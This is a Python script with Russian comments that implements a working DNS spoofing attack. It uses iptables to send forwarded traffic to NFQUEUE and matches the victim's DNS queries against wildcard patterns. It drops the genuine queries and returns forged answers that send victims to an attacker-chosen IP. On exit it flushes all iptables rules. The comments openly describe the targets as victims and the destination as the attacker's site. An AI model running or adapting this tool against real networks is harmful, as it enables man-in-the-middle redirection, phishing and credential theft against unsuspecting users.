import os
import re
import argparse as args


"""
    Программа для подмены DNS ответов от сервера.
    Принимает на вход в качестве параметров:
        Путь к файлу с перечнем шаблонов интернет-ресурсов, с которых
            нужно перенаправить жертву на сайт злоумышленника;
        IP-адрес, на котором находится сайт злоумышленника.

    Названия интернет-ресурсов в файле записываются в столбец. Допускается
        использование масок при записи названия

    Запускать с правами root. Для работы требуются библиотеки:
        scapy
        netfilterqueue - на некоторых системах трудно установить
"""


try:
    from scapy.all import *
except ModuleNotFoundError:
    print("\nYou are have not module 'scapy'! Exiting...\n")
    exit()

try:
    from netfilterqueue import NetfilterQueue
except ModuleNotFoundError:
    print("\nYou are have not module 'netfilterqueue'! Exiting...\n")
    exit()


# Будем хранить шаблоны имен ресурсов и IP-сайта злоумышленника глобально

spoofed_hosts = []
fake_ip = ''


# Парсим аргументы командной строки

def CreateArgParser():

    arg_parser = args.ArgumentParser()

    arg_parser.add_argument('-f', '--file', type=str, required=True,
                            metavar="Path to the file", 
                            help="Path to the file with spoof sites")

    arg_parser.add_argument('-a', '--address', type=str, required=True,
                            metavar="Fake site IP", 
                            help="IP-address of fake site")

    return arg_parser.parse_args()


"""
    Функция отправки фейкового ответа от DNS сервера жертве.
    Здесь проверяется имя ресурса на соответсвие шаблонам.
"""

def send_response(packet):
    qname = packet[DNSQR].qname
    match_flag = False
 
    # Проверяем, подходит ли имя запрашиваемого ресурса
    #  под наши шаблоны

    for host in spoofed_hosts:
        if host.fullmatch(qname.decode()):
            match_flag = True
            break

    # Если имя ни под один шаблон не подошло,
    #  то отсылаем DNS запрос реальному серверу

    if not match_flag:
        return 0

    # Формируем фейковый DNS ответ

    spoofed_response = IP(dst=packet[IP].src, src=packet[IP].dst)/\
                       UDP(dport=packet[UDP].sport, sport=53)/\
                       DNS(id=packet[DNS].id, qr=1, ancount=1,
                           qd=packet[DNSQR],
                           an=DNSRR(rrname=packet[DNSQR].qname, 
                           ttl=56, rdata=fake_ip))

    # Отсылаем ответ жертве

    send(spoofed_response, verbose=0)

    return 1


"""
    Функция обработки очередного поступившего пакета.
    Пакет проверяется на принадлежность к DNS запросу,
     все остальные пакеты отправляются без изменений.

    Если поступил DNS запрос, полностью подходящий под условия,
     то он не пересылается реальному DNS серверу (дропается),
     а жертве отсылается фейковый ответ.
"""

def process_packet(packet):

    scapy_packet = IP(packet.get_payload())

    if scapy_packet.haslayer(DNSQR):
        if send_response(scapy_packet):
            packet.drop()
            print("Drop DNS packet with resource name: ", scapy_packet[DNSQR].qname)
        else:
            packet.accept()
    else:
        packet.accept()


# Главная функция

def main():

    if os.getuid():
        print("\nPlease, run this program as root! Exiting...\n")
        exit()

    namespace = CreateArgParser()

    targets_file = open(namespace.file, 'r')
    targets_data = targets_file.read()
    targets_file.close()

    # Считанные строки из файла разбиваем по
    #  символу перевода строки, убираем
    #  пустую строку из конца списка

    targets_data = targets_data.split('\n')
    targets_data.pop(len(targets_data) - 1)


    # Переводим маски в регулярные выражения

    for i in range(len(targets_data)):
        targets_data[i] = targets_data[i].replace('.', '\.')
        targets_data[i] = targets_data[i].replace('*', '.*')
        targets_data[i] = targets_data[i].replace('?', '.')
        targets_data[i] = targets_data[i] + '$'


    # Формируем список заранее скомпилированных регулярных
    #  выражений

    global spoofed_hosts
    spoofed_hosts = [re.compile(_) for _ in targets_data]
    
    print("Masks for spoofed names: ", spoofed_hosts)

    global fake_ip
    fake_ip = namespace.address


    # Говорим файерволлу, чтобы он кидал перенаправляемый
    #  трафик в специальную очередь с номером 0

    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")

    print("Start spoofing...")


    # Инициализируем экземпляр класса очереди

    queue = NetfilterQueue()


    # Подлючаемся к очереди под номером 0 и
    #  обрабатываем поступающие от жертвы пакеты
    # По нажатию Ctrl+C восстанавливаем настройки
    #  файерволла и выходим
    
    try:
        queue.bind(0, process_packet)
        queue.run()
    except KeyboardInterrupt:
        os.system("iptables --flush")
        print("Stop spoofing...")


if __name__ == "__main__":
    main()
